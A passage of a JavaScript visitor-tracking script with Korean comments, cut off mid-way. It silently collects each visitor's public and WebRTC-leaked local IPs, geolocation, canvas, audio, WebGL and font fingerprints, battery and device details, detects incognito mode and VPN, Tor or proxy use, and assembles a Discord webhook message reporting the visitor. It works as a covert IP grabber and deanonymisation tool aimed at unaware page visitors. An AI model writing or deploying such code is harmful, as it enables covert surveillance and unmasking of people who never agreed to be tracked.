            result.reasons.push('기본 VM 화면 크기 감지 (800x600)');
            result.anomalies.push('vm-screen');
            result.suspicious = true;
        }
    }

    // 6. 터치 지원 불일치
    const isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
    const hasTouch = navigator.maxTouchPoints > 0;
    if (isMobile && !hasTouch) {
        result.points += 10;
        result.reasons.push('모바일 UA인데 터치 미지원 (에뮬레이터 의심)');
        result.anomalies.push('fake-mobile');
        result.suspicious = true;
    }

    // 7. Do Not Track 설정
    if (navigator.doNotTrack === '1') {
        result.points += 5;
        result.reasons.push('Do Not Track 활성화 (프라이버시 중시 사용자)');
    }

    // 8. 배터리 API 누락 (데스크톱에서)
    if (!isMobile && !('getBattery' in navigator)) {
        result.points += 3;
        result.reasons.push('배터리 API 미지원');
    }

    return result;
}

/**
 * WebRTC 연결 지연 측정
 * VPN/프록시 사용시 지연이 증가할 수 있음
 */
async function measureWebRTCLatency() {
    const result = {
        latency: 0,
        suspicious: false,
        points: 0,
        reason: ''
    };

    try {
        const startTime = Date.now();
        
        // 간단한 STUN 요청으로 지연 측정
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        pc.createDataChannel('latency-test');

        await pc.createOffer().then(offer => pc.setLocalDescription(offer));

        // ICE candidate 수집 대기
        await new Promise((resolve) => {
            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    resolve();
                }
            };
            setTimeout(resolve, 2000); // 최대 2초 대기
        });

        const endTime = Date.now();
        result.latency = endTime - startTime;

        pc.close();

        // 지연이 비정상적으로 높으면 의심
        if (result.latency > 1500) {
            result.suspicious = true;
            result.points = 20;
            result.reason = `WebRTC 연결 지연 높음: ${result.latency}ms (VPN/프록시 의심)`;
        } else if (result.latency > 1000) {
            result.suspicious = true;
            result.points = 10;
            result.reason = `WebRTC 연결 지연 약간 높음: ${result.latency}ms`;
        }

    } catch (error) {
        result.error = error.message;
        result.suspicious = true;
        result.points = 15;
        result.reason = 'WebRTC 연결 실패';
    }

    return result;
}

/**
 * 타임존 일관성 체크
 * IP 기반 위치의 타임존 vs 브라우저 타임존
 */
async function checkTimezoneConsistency() {
    const result = {
        consistent: true,
        suspicionPoints: 0,
        reason: "",
        details: {}
    };

    try {
        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const browserOffset = new Date().getTimezoneOffset();
        
        // IP 기반 위치의 타임존 (이미 수집된 경우)
        const locationTimezone = visitorInfo.location?.timezone;

        result.details.browserTimezone = browserTimezone;
        result.details.browserOffset = browserOffset;
        result.details.locationTimezone = locationTimezone;

        if (locationTimezone && browserTimezone !== locationTimezone) {
            // 타임존이 완전히 다른 경우
            result.consistent = false;
            result.suspicionPoints = 35;
            result.reason = `타임존 불일치: 브라우저(${browserTimezone}) vs 위치(${locationTimezone})`;
        }

        // 추가: 언어 설정 vs 위치 불일치
        const browserLang = navigator.language || navigator.userLanguage;
        const countryCode = visitorInfo.location?.countryCode;
        
        if (countryCode && browserLang) {
            const langCountry = browserLang.split('-')[1]?.toUpperCase();
            if (langCountry && langCountry !== countryCode && langCountry !== 'US') {
                result.suspicionPoints += 10;
                result.reason += ` | 언어(${browserLang})와 국가(${countryCode}) 불일치`;
            }
        }

    } catch (error) {
        result.error = error.message;
    }

    return result;
}

/**
 * 알려진 VPN/프록시 서비스 탐지
 * ISP, 조직명, 호스팅 서비스 체크
 */
async function checkKnownVPNServices() {
    const result = {
        detected: false,
        service: null,
        type: null
    };

    const isp = visitorInfo.location?.isp?.toLowerCase() || "";
    const org = visitorInfo.location?.org?.toLowerCase() || "";

    // 알려진 VPN 서비스 키워드
    const vpnKeywords = [
        'vpn', 'proxy', 'nordvpn', 'expressvpn', 'surfshark', 'cyberghost',
        'private internet access', 'protonvpn', 'tunnelbear', 'windscribe',
        'mullvad', 'ivpn', 'airvpn', 'perfect privacy', 'vyprvpn',
        'hide.me', 'hotspot shield', 'ipvanish', 'purevpn', 'zenmate'
    ];

    // 데이터센터/호스팅 서비스 키워드
    const hostingKeywords = [
        'amazon', 'aws', 'google cloud', 'microsoft azure', 'digitalocean',
        'linode', 'vultr', 'ovh', 'hetzner', 'contabo', 'scaleway',
        'datacamp', 'choopa', 'servermania', 'hostwinds', 'psychz'
    ];

    for (const keyword of vpnKeywords) {
        if (isp.includes(keyword) || org.includes(keyword)) {
            result.detected = true;
            result.service = keyword;
            result.type = 'VPN';
            break;
        }
    }

    if (!result.detected) {
        for (const keyword of hostingKeywords) {
            if (isp.includes(keyword) || org.includes(keyword)) {
                result.detected = true;
                result.service = keyword;
                result.type = 'Hosting/Datacenter';
                break;
            }
        }
    }

    return result;
}

/**
 * Tor 네트워크 감지
 * 공개 Tor exit node 목록과 비교
 */
async function checkTorNetwork() {
    const result = {
        isTor: false,
        checked: false
    };

    try {
        // Tor exit node 체크 (TorProject API 또는 공개 DB 사용)
        const ip = visitorInfo.ip;
        if (!ip) return result;

        // 방법 1: Tor Project의 공식 체크
        // https://check.torproject.org/torbulkexitlist 사용 가능
        
        // 방법 2: ISP/조직명에서 Tor 감지
        const isp = visitorInfo.location?.isp?.toLowerCase() || "";
        const org = visitorInfo.location?.org?.toLowerCase() || "";

        if (isp.includes('tor') || org.includes('tor') || 
            isp.includes('exit') && isp.includes('node')) {
            result.isTor = true;
            result.checked = true;
        }

        // 방법 3: 리버스 DNS가 Tor 패턴인지 확인
        // 실제 구현시 DNS API 사용

    } catch (error) {
        result.error = error.message;
    }

    return result;
}

/**
 * DNS 누출 체크
 * DNS 서버가 VPN과 같은 국가에 있는지 확인
 */
async function checkDNSLeak() {
    const result = {
        leaked: false,
        dnsServers: [],
        details: null
    };

    try {
        // DNS Leak 체크는 브라우저에서 CORS 제한으로 직접 불가능
        // 대신 타임존과 IP 위치 불일치로 간접 추론
        
        const ipCountry = visitorInfo.location?.countryCode;
        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // 타임존으로 예상되는 국가와 IP 국가 비교
        if (ipCountry && browserTimezone) {
            // 간단한 타임존-국가 매핑 (주요 국가만)
            const timezoneToCountry = {
                'Asia/Seoul': 'KR',
                'America/New_York': 'US',
                'Europe/London': 'GB',
                'Asia/Tokyo': 'JP',
                'Asia/Shanghai': 'CN',
            };
            
            const expectedCountry = timezoneToCountry[browserTimezone];
            if (expectedCountry && expectedCountry !== ipCountry) {
                result.leaked = true;
                result.details = `타임존(${browserTimezone})과 IP 국가(${ipCountry}) 불일치`;
            }
        }
    } catch (error) {
        // 실패시 무시
        result.error = error.message;
    }

    return result;
}

/**
 * 추가: 프록시 헤더 감지
 * 일부 프록시는 HTTP 헤더에 흔적을 남김
 */
function detectProxyHeaders() {
    const suspiciousHeaders = [];
    
    // 브라우저에서는 직접 헤더를 읽을 수 없지만,
    // 서버 사이드에서 다음 헤더들을 체크 가능:
    // X-Forwarded-For, X-Real-IP, Via, X-Proxy-ID 등
    
    return {
        detected: suspiciousHeaders.length > 0,
        headers: suspiciousHeaders
    };
}


/* ========== 기본 정보 수집 ========== */

function getDeviceInfo() {
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        touchPoints: navigator.maxTouchPoints || 0,
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? '온라인' : '오프라인',
        doNotTrack: navigator.doNotTrack || 'N/A'
    };
}

function getScreenInfo() {
    return {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation ? screen.orientation.type : 'N/A'
    };
}

function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    const base = {
        effectiveType: 'N/A',
        downlink: 'N/A',
        rtt: 'N/A',
        saveData: 'N/A',
        type: 'N/A',
        networkCategory: 'N/A' // Wi-Fi / Cellular / Unknown
    };

    if (!connection) return base;

    const info = { ...base };

    info.effectiveType = connection.effectiveType || 'N/A';
    info.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'N/A';
    info.rtt = connection.rtt ? `${connection.rtt}ms` : 'N/A';
    info.saveData = connection.saveData ? '활성화' : '비활성화';
    info.type = connection.type || 'N/A';

    // Wi-Fi / 데이터(셀룰러) 추정
    const t = (connection.type || '').toLowerCase();
    if (t === 'wifi') {
        info.networkCategory = 'Wi-Fi';
    } else if (t === 'cellular' || t === 'wimax') {
        info.networkCategory = 'Cellular';
    } else if (['slow-2g', '2g', '3g', '4g'].includes((connection.effectiveType || '').toLowerCase())) {
        info.networkCategory = 'Cellular(추정)';
    } else {
        info.networkCategory = 'Unknown';
    }

    return info;
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';

    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Firefox') > -1) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Edg') > -1) {
        browserName = 'Edge';
        browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
    }

    return { browserName, browserVersion };
}

function getOSInfo() {
    const ua = navigator.userAgent;
    let osName = 'Unknown';

    if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
    else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
    else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
    else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
    else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
    else if (ua.indexOf('Linux') > -1) osName = 'Linux';
    else if (ua.indexOf('Android') > -1) osName = 'Android';
    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';

    return osName;
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? '충전 중' : '충전 안 함',
                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
            };
        }
    } catch {}
    return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
}

function getMemoryInfo() {
    try {
        if ('memory' in performance) {
            const memory = performance.memory;
            return {
                usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
                totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
                jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
            };
        }
    } catch {}
    return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
}

function getPluginsInfo() {
    const plugins = [];
    try {
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
        }
    } catch {}
    return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
            };
        }
    } catch {}
    return {
        vendor: 'N/A',
        renderer: 'N/A',
        version: 'N/A',
        shadingLanguageVersion: 'N/A',
        unmaskedVendor: 'N/A',
        unmaskedRenderer: 'N/A'
    };
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint ????', 2, 2);
        return canvas.toDataURL().slice(-50);
    } catch {
        return 'N/A';
    }
}

function getAudioFingerprint() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();

        oscillator.connect(analyser);
        analyser.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.frequency.value = 10000;
        gainNode.gain.value = 0;

        const dataArray = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(dataArray);

        audioContext.close();

        return dataArray.slice(0, 10).join(',').slice(0, 50);
    } catch {
        return 'N/A';
    }
}

function getFontsInfo() {
    const fonts = [
        'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
        'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
        'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
        'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
    ];

    const availableFonts = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';

    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    context.font = testSize + ' monospace';
    const baselineWidth = context.measureText(testString).width;

    fonts.forEach(font => {
        context.font = testSize + ' ' + font + ', monospace';
        const width = context.measureText(testString).width;
        if (width !== baselineWidth) {
            availableFonts.push(font);
        }
    });

    return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
}

function getStorageInfo() {
    try {
        const info = {
            localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
            sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
            indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
            webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
        };

        if ('storage' in navigator && 'estimate' in navigator.storage) {
            navigator.storage.estimate().then(estimate => {
                info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
                info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
            });
        }

        return info;
    } catch {
        return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
    }
}

function getMediaDevicesInfo() {
    return new Promise(async (resolve) => {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                resolve({
                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
                    videoInput: devices.filter(d => d.kind === 'videoinput').length
                });
            } else {
                resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
            }
        } catch {
            resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
        }
    });
}

function getTimezoneInfo() {
    try {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: date.getTimezoneOffset(),
            dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale
        };
    } catch {
        return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
    }
}

function getPerformanceInfo() {
    try {
        const nav = performance.getEntriesByType('navigation')[0];
        return {
            loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
            domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
            pageLoadTime: Math.round(performance.now()) + 'ms'
        };
    } catch {
        return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
    }
}

/* ========== 보안 및 프라이버시 정보 ========== */
async function getSecurityInfo() {
    try {
        const incognito = await detectIncognitoMode();
        return {
            doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || window.doNotTrack || 'N/A',
            cookieEnabled: navigator.cookieEnabled ? '✅ 활성화' : '❌ 비활성화',
            localStorage: ('localStorage' in window && window.localStorage !== null) ? '✅ 사용 가능' : '❌ 사용 불가',
            sessionStorage: ('sessionStorage' in window && window.sessionStorage !== null) ? '✅ 사용 가능' : '❌ 사용 불가',
            incognito: incognito
        };
    } catch {
        return {
            doNotTrack: 'N/A',
            cookieEnabled: 'N/A',
            localStorage: 'N/A',
            sessionStorage: 'N/A',
            incognito: 'N/A'
        };
    }
}

async function detectIncognitoMode() {
    try {
        // 방법 1: Storage quota 체크 (가장 정확)
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            const estimate = await navigator.storage.estimate();
            // 시크릿 모드는 quota가 매우 작음 (보통 120MB 미만)
            if (estimate.quota < 120000000) {
                return '🔴 시크릿 모드 가능';
            }
        }
        
        // 방법 2: localStorage 쓰기 테스트
        if ('localStorage' in window) {
            try {
                localStorage.setItem('_test', '1');
                localStorage.removeItem('_test');
                return '❌ 일반 모드';
            } catch {
                return '🔴 시크릿 모드 가능';
            }
        }
        
        return 'N/A';
    } catch {
        return 'N/A';
    }
}

/* ========== 방문 기록 추적 ========== */
function getVisitTracking() {
    try {
        const storageKey = 'visitor_tracking';
        let tracking = {};
        
        // 기존 데이터 로드
        try {
            const stored = localStorage.getItem(storageKey);
            if (stored) {
                tracking = JSON.parse(stored);
            }
        } catch {}
        
        // 첫 방문 여부
        const isFirstVisit = !tracking.firstVisit;
        
        // 방문 횟수 증가
        tracking.visitCount = (tracking.visitCount || 0) + 1;
        
        // 첫 방문 시간 기록
        if (!tracking.firstVisit) {
            tracking.firstVisit = new Date().toISOString();
        }
        
        // 마지막 방문 시간 업데이트
        tracking.lastVisit = new Date().toISOString();
        
        // 저장
        try {
            localStorage.setItem(storageKey, JSON.stringify(tracking));
        } catch {}
        
        return {
            isFirstVisit: isFirstVisit ? '✅ 첫 방문' : '❌ 재방문',
            visitCount: tracking.visitCount || 1,
            firstVisit: tracking.firstVisit ? new Date(tracking.firstVisit).toLocaleString('ko-KR') : 'N/A',
            lastVisit: tracking.lastVisit ? new Date(tracking.lastVisit).toLocaleString('ko-KR') : 'N/A'
        };
    } catch {
        return {
            isFirstVisit: 'N/A',
            visitCount: 'N/A',
            firstVisit: 'N/A',
            lastVisit: 'N/A'
        };
    }
}

/* ========== 언어 및 지역 설정 ========== */
function getLanguageInfo() {
    try {
        return {
            primaryLanguage: navigator.language || 'N/A',
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            platform: navigator.platform || 'N/A',
            userAgent: navigator.userAgent || 'N/A'
        };
    } catch {
        return {
            primaryLanguage: 'N/A',
            languages: 'N/A',
            platform: 'N/A',
            userAgent: 'N/A'
        };
    }
}


/* ========== IP 정보 수집 (IPv4 / IPv6 구분) ========== */

async function getIPInfo() {
    const info = {
        ipv4: null,
        ipv6: null,
        primary: null,
        ipVersion: 'Unknown'
    };

    // IPv4 전용
    try {
        const res4 = await fetch('https://api.ipify.org?format=json');
        const data4 = await res4.json();
        if (data4 && data4.ip && !data4.ip.includes(':')) {
            info.ipv4 = data4.ip;
        }
    } catch {}

    // IPv6(+fallback) 전용
    try {
        const res6 = await fetch('https://api64.ipify.org?format=json');
        const data6 = await res6.json();
        if (data6 && data6.ip) {
            if (data6.ip.includes(':')) {
                info.ipv6 = data6.ip;
            } else if (!info.ipv4) {
                info.ipv4 = data6.ip;
            }
        }
    } catch {}

    // IPv4 우선 사용 (ipapi.co 호환성 향상)
    info.primary = info.ipv4 || info.ipv6;
    if (info.primary) {
        info.ipVersion = info.primary.includes(':') ? 'IPv6' : 'IPv4';
    }

    return info;
}


/* ========== WebRTC STUN 기반 IP 후보 탐지 ========== */

async function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = {
            localIPs: [],
            candidateIPs: [],
            blocked: "No"
        };

        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        });

        pc.createDataChannel("dummy");

        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                    ips.blocked = "Yes";
                }
                resolve(ips);
                return;
            }

            const candidate = event.candidate.candidate;
            const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
            if (!ipMatch) return;

            const ip = ipMatch[1];

            if (candidate.includes("typ host") && !ips.localIPs.includes(ip)) {
                ips.localIPs.push(ip);
            }

            if ((candidate.includes("typ srflx") || candidate.includes("typ relay")) &&
                !ips.candidateIPs.includes(ip)) {
                ips.candidateIPs.push(ip);
            }
        };

        pc.createOffer()
            .then((offer) => pc.setLocalDescription(offer))
            .catch(() => resolve(ips));

        setTimeout(() => {
            if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                ips.blocked = "Yes";
            }
            resolve(ips);
        }, 3000);
    });
}


/* ========== 메인: 수집 후 웹훅 전송 ========== */

async function collectAndSendInfo() {
    // 디버그: 함수 시작
    try {
        localStorage.setItem('debug_start', new Date().toISOString());
    } catch (e) {}
    
    try {
        // 방문 기록 추적
        const visitTracking = getVisitTracking();
        try { localStorage.setItem('debug_step1', 'visitTracking OK'); } catch (e) {}
        
        // IP 정보 (IPv4 / IPv6)
        const ipInfo = await getIPInfo();
        visitorInfo.ipInfo = ipInfo;
        visitorInfo.ip = ipInfo.primary;
        visitorInfo.ipVersion = ipInfo.ipVersion;
        try { localStorage.setItem('debug_step2', `ipInfo OK: ${ipInfo.primary}`); } catch (e) {}

        // 위치 정보 - ipapi.co API 사용 (상세 정보 포함, 타임아웃 추가)
        if (visitorInfo.ip) {
            try {
                try { localStorage.setItem('debug_step3', 'Starting ipapi.co'); } catch (e) {}
                
                // 타임아웃 추가 (5초)
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                
                const ipApiResponse = await fetch(`https://ipapi.co/${visitorInfo.ip}/json/`, {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                
                const ipApiData = await ipApiResponse.json();
                
                // ipapi.co 에러 응답 체크 (예: VPN IP 거부)
                if (ipApiData.error || !ipApiData.country_code) {
                    throw new Error('ipapi.co rejected this IP or returned error');
                }
                
                try { localStorage.setItem('debug_step4', 'ipapi.co success'); } catch (e) {}
                
                visitorInfo.location = {
                    country: ipApiData.country_name || 'Unknown',
                    countryCode: ipApiData.country_code || 'XX',
                    region: ipApiData.region || 'N/A',
                    city: ipApiData.city || 'N/A',
                    isp: ipApiData.org || 'Unknown',
                    org: ipApiData.org || 'N/A',
                    timezone: ipApiData.timezone || '',
                    lat: ipApiData.latitude || 0,
                    lon: ipApiData.longitude || 0,
                    asn: ipApiData.asn || 'N/A',
                    connection_type: ipApiData.connection_type || 'N/A',
                    mobile: ipApiData.mobile ? 'Yes' : 'No'
                };
            } catch (e) {
                // API 실패 시 Cloudflare trace 백업 사용
                try { localStorage.setItem('debug_ipapi_error', e.toString()); } catch (e2) {}
                try {
                    try { localStorage.setItem('debug_step4b', 'Trying Cloudflare'); } catch (e2) {}
                    
                    const controller2 = new AbortController();
                    const timeoutId2 = setTimeout(() => controller2.abort(), 5000);
                    
                    const traceResponse = await fetch('https://1.1.1.1/cdn-cgi/trace', {
                        signal: controller2.signal
                    });
                    clearTimeout(timeoutId2);
                    
                    const traceText = await traceResponse.text();
                    try { localStorage.setItem('debug_step5', 'Cloudflare success'); } catch (e2) {}
                    const traceData = {};
                    traceText.split('\n').forEach(line => {
                        const [key, value] = line.split('=');
                        if (key && value) traceData[key] = value;
                    });
                    
                    visitorInfo.location = {
                        country: traceData.loc || 'Unknown',
                        countryCode: traceData.loc || 'XX',
                        region: 'N/A',
                        city: 'N/A',
                        isp: traceData.colo || 'Unknown',
                        org: 'N/A',
                        timezone: traceData.tz || '',
                        lat: 0,
                        lon: 0,
                        asn: 'N/A',
                        connection_type: 'N/A',
                        mobile: 'N/A'
                    };
                } catch (e2) {
                    // 완전 실패 시 기본값
                    try { localStorage.setItem('debug_trace_error', e2.toString()); } catch (e3) {}
                    try { localStorage.setItem('debug_step5', 'Using defaults'); } catch (e3) {}
                    visitorInfo.location = {
                        country: 'Unknown',
                        countryCode: 'XX',
                        region: 'N/A',
                        city: 'N/A',
                        isp: 'Unknown',
                        org: 'N/A',
                        timezone: '',
                        lat: 0,
                        lon: 0,
                        asn: 'N/A',
                        connection_type: 'N/A',
                        mobile: 'N/A'
                    };
                }
            }
        }

        const now = new Date();
        visitorInfo.timestamp = now.toISOString();
        visitorInfo.localTime = now.toLocaleString('ko-KR');
        visitorInfo.timezoneString = Intl.DateTimeFormat().resolvedOptions().timeZone;
        try { localStorage.setItem('debug_step6', 'Basic info set'); } catch (e) {}

        visitorInfo.device = getDeviceInfo();
        visitorInfo.browser = getBrowserInfo();
        visitorInfo.os = getOSInfo();
        visitorInfo.screen = getScreenInfo();
        visitorInfo.network = getNetworkInfo();
        
        try {
            visitorInfo.battery = await Promise.race([
                getBatteryInfo(),
                new Promise(resolve => setTimeout(() => resolve({ level: 'N/A', charging: 'N/A' }), 2000))
            ]);
        } catch (e) {
            visitorInfo.battery = { level: 'N/A', charging: 'N/A' };
        }
        
        visitorInfo.memory = getMemoryInfo();
        visitorInfo.plugins = getPluginsInfo();
        visitorInfo.webgl = getWebGLInfo();
        visitorInfo.canvasFingerprint = getCanvasFingerprint();
        visitorInfo.audioFingerprint = getAudioFingerprint();
        visitorInfo.fonts = getFontsInfo();
        visitorInfo.storage = getStorageInfo();
        
        try {
            visitorInfo.mediaDevices = await Promise.race([
                getMediaDevicesInfo(),
                new Promise(resolve => setTimeout(() => resolve({ cameras: 0, microphones: 0 }), 2000))
            ]);
        } catch (e) {
            visitorInfo.mediaDevices = { cameras: 0, microphones: 0 };
        }
        
        visitorInfo.timezoneInfo = getTimezoneInfo();
        visitorInfo.performance = getPerformanceInfo();
        visitorInfo.url = window.location.href;
        visitorInfo.referrer = document.referrer || '직접 접속';
        try { localStorage.setItem('debug_step7', 'Device info collected'); } catch (e) {}

        // 추가 정보 수집 (async 함수 대응, 타임아웃 추가)
        try {
            const securityInfo = await Promise.race([
                getSecurityInfo(),
                new Promise(resolve => setTimeout(() => resolve({}), 2000))
            ]);
            visitorInfo.securityInfo = securityInfo;
        } catch (e) {
            visitorInfo.securityInfo = {};
        }
        
        visitorInfo.visitTracking = visitTracking;
        visitorInfo.languageInfo = getLanguageInfo();
        try { localStorage.setItem('debug_step8', 'Security info collected'); } catch (e) {}

        // WebRTC IP 후보 정보 (타임아웃 추가)
        try {
            visitorInfo.webRTC = await Promise.race([
                getWebRTCIPs(),
                new Promise(resolve => setTimeout(() => resolve({ localIPs: [], candidateIPs: [], blocked: 'Timeout' }), 3000))
            ]);
        } catch (e) {
            visitorInfo.webRTC = { localIPs: [], candidateIPs: [], blocked: 'Error' };
        }
        try { localStorage.setItem('debug_step9', 'WebRTC done'); } catch (e) {}

        // VPN/프록시 탐지 (타임아웃 추가 - 5초)
        try {
            visitorInfo.vpnDetection = await Promise.race([
                detectVPNProxy(visitorInfo),
                new Promise(resolve => setTimeout(() => resolve({
                    isVPN: false,
                    isTor: false,
                    isProxy: false,
                    score: 0,
                    riskLevel: 'none',
                    confidence: 0,
                    evidence: [],
                    reasons: ['타임아웃으로 인한 기본값'],
                    suspicionLevel: 0
                }), 5000))
            ]);
        } catch (e) {
            visitorInfo.vpnDetection = {
                isVPN: false,
                error: e.toString(),
                riskLevel: 'none',
                confidence: 0
            };
        }
        try { localStorage.setItem('debug_step10', 'VPN detection done'); } catch (e) {}
        
        // Discord 색상 결정 함수 (riskLevel 기반)
        function getEmbedColor(detection) {
            const colors = {
                critical: 0xFF0000,  // 빨강
                high: 0xFF6B00,      // 주황
                medium: 0xFFCC00,    // 노랑
                low: 0x00FF00,       // 초록
                none: 0x5865F2       // 파랑 (기본)
            };
            return colors[detection.riskLevel] || 0x5865F2;
        }

        // 제목 결정 함수
        function getEmbedTitle(detection) {
            if (detection.riskLevel === 'critical') {
                return '🔴 CRITICAL: VPN/Tor 감지!';
            } else if (detection.riskLevel === 'high') {
                return '🟠 HIGH RISK: VPN 의심';
            } else if (detection.riskLevel === 'medium') {
                return '🟡 MEDIUM: 프록시 가능성';
            } else if (detection.riskLevel === 'low') {
                return '🟢 LOW: 약간 의심';
            } else {
                return '✅ 새로운 방문자 정보';
            }
        }

        const embed = {
            title: getEmbedTitle(visitorInfo.vpnDetection),
            description: "사용자가 페이지에 접속했습니다.",
            color: getEmbedColor(visitorInfo.vpnDetection),
            timestamp: visitorInfo.timestamp,
            thumbnail: {
                url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
            },
            fields: [
                {
                    name: "🎯 VPN/프록시 탐지 결과",
                    value:
